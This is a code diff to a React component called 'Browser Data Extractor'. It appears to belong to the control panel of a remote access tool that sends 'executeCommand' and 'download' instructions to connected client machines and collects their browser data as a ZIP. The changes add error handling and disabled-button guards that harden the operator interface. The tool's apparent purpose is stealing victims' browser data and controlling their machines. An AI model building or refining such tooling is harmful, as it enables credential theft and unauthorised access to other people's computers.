@@ -231,7 +231,7 @@ const BrowserExtractor = ({ client, socket }) => {
 
   // Listen for command responses
   useEffect(() => {
-    if (!socket || !client) return;
+    if (!socket || typeof socket.on !== 'function' || !client) return;
 
     const handleCommandResponse = (data) => {
       if (data.clientId === client.id) {
@@ -279,8 +279,12 @@ const BrowserExtractor = ({ client, socket }) => {
       }
     };
 
-    socket.on('commandResponse', handleCommandResponse);
-    return () => socket.off('commandResponse', handleCommandResponse);
+    try {
+      socket.on('commandResponse', handleCommandResponse);
+    } catch (_) {}
+    return () => {
+      try { socket.off && socket.off('commandResponse', handleCommandResponse); } catch (_) {}
+    };
   }, [socket, client]);
 
   const handleExtract = (type) => {
@@ -298,12 +302,16 @@ const BrowserExtractor = ({ client, socket }) => {
   };
 
   const handleDownloadZip = () => {
-    if (!socket || !client || !zipPath) return;
-    socket.emit('executeCommand', {
-      clientId: client.id,
-      command: `download ${zipPath}`
-    });
-    toast.info('Download command sent for ZIP');
+    if (!socket || typeof socket.emit !== 'function' || !client || !zipPath) return;
+    try {
+      socket.emit('executeCommand', {
+        clientId: client.id,
+        command: `download ${zipPath}`
+      });
+      toast.info('Download command sent for ZIP');
+    } catch (e) {
+      // no-op; prevents any socket errors from bubbling and affecting global UI
+    }
   };
 
   const handleViewPaths = () => {
@@ -339,7 +347,7 @@ const BrowserExtractor = ({ client, socket }) => {
           <FiShield />
           Browser Data Extractor
         </Title>
-        <ActionButton onClick={handleViewPaths}>
+        <ActionButton onClick={handleViewPaths} disabled={!socket || !client}>
           <FiEye />
           View Paths
         </ActionButton>
